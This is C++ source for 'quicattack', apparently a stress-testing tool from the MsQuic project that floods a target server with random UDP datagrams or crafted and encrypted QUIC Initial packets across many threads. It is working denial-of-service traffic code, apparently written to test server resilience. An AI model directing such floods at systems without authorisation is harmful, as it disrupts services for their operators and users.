/*++

    Copyright (c) Microsoft Corporation.
    Licensed under the MIT License.

--*/

#pragma warning(disable:4200)  // nonstandard extension used: bit field types other than int
#pragma warning(disable:4201)  // nonstandard extension used: nameless struct/union
#pragma warning(disable:4204)  // nonstandard extension used: non-constant aggregate initializer
#pragma warning(disable:4214)  // nonstandard extension used: zero-sized array in struct/union
#pragma warning(disable:28931) // Unused Assignment

#include <precomp.h> // from 'core' dir
#include <msquichelper.h>

#include "packet_writer.h"

#define US_TO_MS(x) ((x) / 1000)

#define QUIC_MIN_INITIAL_LENGTH 1200

#define ATTACK_TIMEOUT_DEFAULT_MS (60 * 1000)

#define ATTACK_THREADS_DEFAULT QuicProcActiveCount()

#define ATTACK_PORT_DEFAULT 443

static QUIC_DATAPATH* Datapath;
static QUIC_DATAPATH_BINDING* Binding;

static uint32_t AttackType;
static const char* ServerName;
static const char* IpAddress;
static QUIC_ADDR ServerAddress;
static const char* Alpn = "h3-29";
static uint64_t TimeoutMs = ATTACK_TIMEOUT_DEFAULT_MS;
static uint32_t ThreadCount = ATTACK_THREADS_DEFAULT;

static uint64_t TimeStart;
static int64_t TotalPacketCount;
static int64_t TotalByteCount;

void PrintUsage()
{
    printf("quicattack is used for generating attack traffic towards a designated server.\n\n");

    printf("Usage:\n");
    printf("  quicattack.exe -list\n\n");
    printf("  quicattack.exe -type:<number> -ip:<ip_address_and_port> [-alpn:<protocol_name>] [-sni:<host_name>] [-timeout:<ms>] [-threads:<count>]\n\n");
}

void PrintUsageList()
{
    printf("The following are the different types of attacks supported by the tool.\n\n");

    printf("#1 - Random UDP 1 byte UDP packets.\n");
    printf("#2 - Random UDP full length UDP packets.\n");
    printf("#3 - Random QUIC Initial packets.\n");
    printf("#4 - Valid QUIC initial packets.\n");
}

struct StrBuffer
{
    uint8_t* Data;
    uint16_t Length;

    StrBuffer(const char* HexBytes)
    {
        Length = (uint16_t)(strlen(HexBytes) / 2);
        Data = new uint8_t[Length];

        for (uint16_t i = 0; i < Length; ++i) {
            Data[i] =
                (DecodeHexChar(HexBytes[i * 2]) << 4) |
                DecodeHexChar(HexBytes[i * 2 + 1]);
        }
    }

    ~StrBuffer() { delete [] Data; }
};

_IRQL_requires_max_(DISPATCH_LEVEL)
_Function_class_(QUIC_DATAPATH_RECEIVE_CALLBACK)
void
UdpRecvCallback(
    _In_ QUIC_DATAPATH_BINDING* /* Binding */,
    _In_ void* /* Context */,
    _In_ QUIC_RECV_DATAGRAM* RecvBufferChain
    )
{
    QuicDataPathBindingReturnRecvDatagrams(RecvBufferChain);
}

_IRQL_requires_max_(DISPATCH_LEVEL)
_Function_class_(QUIC_DATAPATH_UNREACHABLE_CALLBACK)
void
UdpUnreachCallback(
    _In_ QUIC_DATAPATH_BINDING* /* Binding */,
    _In_ void* /* Context */,
    _In_ const QUIC_ADDR* /* RemoteAddress */
    )
{
}

void RunAttackRandom(uint16_t Length, bool ValidQuic)
{
    uint64_t ConnectionId = 0;
    QuicRandom(sizeof(ConnectionId), &ConnectionId);

    while (QuicTimeDiff64(TimeStart, QuicTimeMs64()) < TimeoutMs) {

        QUIC_DATAPATH_SEND_CONTEXT* SendContext =
            QuicDataPathBindingAllocSendContext(
                Binding, QUIC_ECN_NON_ECT, Length);
        if (SendContext == nullptr) {
            printf("QuicDataPathBindingAllocSendContext failed\n");
            return;
        }

        while (!QuicDataPathBindingIsSendContextFull(SendContext)) {
            QUIC_BUFFER* SendBuffer =
                QuicDataPathBindingAllocSendDatagram(SendContext, Length);
            if (SendBuffer == nullptr) {
                printf("QuicDataPathBindingAllocSendDatagram failed\n");
                QuicDataPathBindingFreeSendContext(SendContext);
                return;
            }

            QuicRandom(Length, SendBuffer->Buffer);

            if (ValidQuic) {
                QUIC_LONG_HEADER_V1* Header =
                    (QUIC_LONG_HEADER_V1*)SendBuffer->Buffer;
                Header->IsLongHeader = 1;
                Header->Type = QUIC_INITIAL;
                Header->FixedBit = 1;
                Header->Reserved = 0;
                Header->Version = QUIC_VERSION_LATEST;
                Header->DestCidLength = 8;
                ConnectionId++;
                QuicCopyMemory(Header->DestCid, &ConnectionId, sizeof(ConnectionId));
                Header->DestCid[8] = 8;
                Header->DestCid[17] = 0;
                QuicVarIntEncode(
                    Length - (MIN_LONG_HEADER_LENGTH_V1 + 19),
                    Header->DestCid + 18);
            }

            InterlockedExchangeAdd64(&TotalPacketCount, 1);
            InterlockedExchangeAdd64(&TotalByteCount, Length);
        }

        QUIC_STATUS Status =
            QuicDataPathBindingSendTo(
                Binding,
                &ServerAddress,
                SendContext);
        if (QUIC_FAILED(Status)) {
            printf("QuicDataPathBindingSendTo failed, 0x%x\n", Status);
            return;
        }
    }
}

#if DEBUG
void printf_buf(const char* name, void* buf, uint32_t len)
{
    printf("%s: ", name);
    for (uint32_t i = 0; i < len; i++) {
        printf("%.2X", ((uint8_t*)buf)[i]);
    }
    printf("\n");
}
#else
#define printf_buf(name, buf, len)
#endif

void RunAttackValidInitial()
{
    const StrBuffer InitialSalt("afbfec289993d24c9e9786f19c6111e04390a899");
    const uint16_t DatagramLength = QUIC_MIN_INITIAL_LENGTH;
    const uint64_t PacketNumber = 0;

    uint8_t Packet[512] = {0};
    uint16_t PacketLength, HeaderLength;
    PacketWriter::WriteClientInitialPacket(
        PacketNumber,
        sizeof(uint64_t),
        Alpn,
        ServerName,
        sizeof(Packet),
        Packet,
        &PacketLength,
        &HeaderLength);
    uint16_t PacketNumberOffset = HeaderLength - sizeof(uint32_t);

    uint64_t* DestCid = (uint64_t*)(Packet + sizeof(QUIC_LONG_HEADER_V1));
    uint64_t* SrcCid = (uint64_t*)(Packet + sizeof(QUIC_LONG_HEADER_V1) + sizeof(uint64_t) + sizeof(uint8_t));

    uint64_t* OrigSrcCid = nullptr;
    for (uint16_t i = HeaderLength; i < PacketLength; ++i) {
        if (MagicCid == *(uint64_t*)&Packet[i]) {
            OrigSrcCid = (uint64_t*)&Packet[i];
        }
    }
    if (!OrigSrcCid) {
        printf("Failed to find OrigSrcCid!\n");
        return;
    }

    QuicRandom(sizeof(uint64_t), DestCid);
    QuicRandom(sizeof(uint64_t), SrcCid);

    while (QuicTimeDiff64(TimeStart, QuicTimeMs64()) < TimeoutMs) {

        QUIC_DATAPATH_SEND_CONTEXT* SendContext =
            QuicDataPathBindingAllocSendContext(
                Binding, QUIC_ECN_NON_ECT, DatagramLength);
        VERIFY(SendContext);

        while (QuicTimeDiff64(TimeStart, QuicTimeMs64()) < TimeoutMs &&
            !QuicDataPathBindingIsSendContextFull(SendContext)) {
            QUIC_BUFFER* SendBuffer =
                QuicDataPathBindingAllocSendDatagram(SendContext, DatagramLength);
            VERIFY(SendBuffer);

            (*DestCid)++; (*SrcCid)++;
            *OrigSrcCid = *SrcCid;
            memcpy(SendBuffer->Buffer, Packet, PacketLength);

            printf_buf("cleartext", SendBuffer->Buffer, PacketLength - QUIC_ENCRYPTION_OVERHEAD);

            QUIC_PACKET_KEY* WriteKey;
            VERIFY(
            QUIC_SUCCEEDED(
            QuicPacketKeyCreateInitial(
                FALSE,
                InitialSalt.Data,
                sizeof(uint64_t),
                (uint8_t*)DestCid,
                nullptr,
                &WriteKey)));

            printf_buf("salt", InitialSalt.Data, InitialSalt.Length);
            printf_buf("cid", DestCid, sizeof(uint64_t));

            uint8_t Iv[QUIC_IV_LENGTH];
            QuicCryptoCombineIvAndPacketNumber(
                WriteKey->Iv, (uint8_t*)&PacketNumber, Iv);

            QuicEncrypt(
                WriteKey->PacketKey,
                Iv,
                HeaderLength,
                SendBuffer->Buffer,
                PacketLength - HeaderLength,
                SendBuffer->Buffer + HeaderLength);

            printf_buf("encrypted", SendBuffer->Buffer, PacketLength);

            uint8_t HpMask[16];
            QuicHpComputeMask(
                WriteKey->HeaderKey,
                1,
                SendBuffer->Buffer + HeaderLength,
                HpMask);

            printf_buf("cipher_text", SendBuffer->Buffer + HeaderLength, 16);
            printf_buf("hp_mask", HpMask, 16);

            QuicPacketKeyFree(WriteKey);

            SendBuffer->Buffer[0] ^= HpMask[0] & 0x0F;
            for (uint8_t i = 0; i < 4; ++i) {
                SendBuffer->Buffer[PacketNumberOffset + i] ^= HpMask[i + 1];
            }

            printf_buf("protected", SendBuffer->Buffer, PacketLength);

            InterlockedExchangeAdd64(&TotalPacketCount, 1);
            InterlockedExchangeAdd64(&TotalByteCount, DatagramLength);
        }

        VERIFY(
        QUIC_SUCCEEDED(
        QuicDataPathBindingSendTo(
            Binding,
            &ServerAddress,
            SendContext)));
    }
}

QUIC_THREAD_CALLBACK(RunAttackThread, Context)
{
    UNREFERENCED_PARAMETER(Context);
    switch (AttackType) {
    case 1:
        RunAttackRandom(1, false);
        break;
    case 2:
        RunAttackRandom(QUIC_MIN_INITIAL_LENGTH, false);
        break;
    case 3:
        RunAttackRandom(QUIC_MIN_INITIAL_LENGTH, true);
        break;
    case 4:
        RunAttackValidInitial();
        break;
    default:
        break;
    }
    QUIC_THREAD_RETURN(QUIC_STATUS_SUCCESS);
}

void RunAttack()
{
    QUIC_STATUS Status =
        QuicDataPathBindingCreate(
            Datapath,
            nullptr,
            &ServerAddress,
            nullptr,
            &Binding);
    if (QUIC_FAILED(Status)) {
        printf("QuicDataPathBindingCreate failed, 0x%x\n", Status);
        return;
    }

    QUIC_THREAD* Threads =
        (QUIC_THREAD*)QUIC_ALLOC_PAGED(ThreadCount * sizeof(QUIC_THREAD));

    uint32_t ProcCount = QuicProcActiveCount();
    TimeStart = QuicTimeMs64();

    for (uint32_t i = 0; i < ThreadCount; ++i) {
        QUIC_THREAD_CONFIG ThreadConfig = {
            QUIC_THREAD_FLAG_SET_AFFINITIZE,
            (uint8_t)(i % ProcCount),
            "AttackRunner",
            RunAttackThread,
            nullptr
        };
        QuicThreadCreate(&ThreadConfig, &Threads[i]);
    }

    for (uint32_t i = 0; i < ThreadCount; ++i) {
        QuicThreadWait(&Threads[i]);
        QuicThreadDelete(&Threads[i]);
    }

    uint64_t TimeEnd = QuicTimeMs64();
    printf("Packet Rate: %llu KHz\n", (unsigned long long)(TotalPacketCount) / QuicTimeDiff64(TimeStart, TimeEnd));
    printf("Bit Rate: %llu mbps\n", (unsigned long long)(8 * TotalByteCount) / (1000 * QuicTimeDiff64(TimeStart, TimeEnd)));
    QUIC_FREE(Threads);

    QuicDataPathBindingDelete(Binding);
}

int
QUIC_MAIN_EXPORT
main(
    _In_ int argc,
    _In_reads_(argc) _Null_terminated_ char* argv[]
    )
{
    int ErrorCode = -1;

    QuicPlatformSystemLoad();
    QuicPlatformInitialize();
    QuicDataPathInitialize(
        0,
        UdpRecvCallback,
        UdpUnreachCallback,
        &Datapath);

    if (argc < 2) {
        PrintUsage();
        goto Error;
    }

    if (strcmp("-list", argv[1]) == 0) {
        PrintUsageList();
        ErrorCode = 0;

    } else {
        if (!TryGetValue(argc, argv, "type", &AttackType)) {
            PrintUsage();
            goto Error;
        }

        if (AttackType < 1 || AttackType > 4) {
            printf("Invalid -type:'%u' specified!\n", AttackType);
            goto Error;
        }

        TryGetValue(argc, argv, "ip", &IpAddress);
        TryGetValue(argc, argv, "alpn", &Alpn);
        TryGetValue(argc, argv, "sni", &ServerName);
        TryGetValue(argc, argv, "timeout", &TimeoutMs);
        TryGetValue(argc, argv, "threads", &ThreadCount);

        if (IpAddress == nullptr) {
            if (ServerName == nullptr) {
                printf("'ip' or 'sni' must be specified!\n");
                goto Error;
            }
            if (QUIC_FAILED(
                QuicDataPathResolveAddress(
                    Datapath,
                    ServerName,
                    &ServerAddress))) {
                printf("Failed to resolve IP address of '%s'.\n", ServerName);
                goto Error;
            }
            QuicAddrSetPort(&ServerAddress, ATTACK_PORT_DEFAULT);
        } else {
            if (!QuicAddrFromString(IpAddress, ATTACK_PORT_DEFAULT, &ServerAddress)) {
                printf("Invalid -ip:'%s' specified!\n", IpAddress);
                goto Error;
            }
        }

        if (ServerAddress.Ipv4.sin_port == 0) {
            printf("A UDP port must be specified with the IP address.\n");
            goto Error;
        }

        RunAttack();
        ErrorCode = 0;
    }

Error:

    QuicDataPathUninitialize(Datapath);
    QuicPlatformUninitialize();
    QuicPlatformSystemUnload();

    return ErrorCode;
}
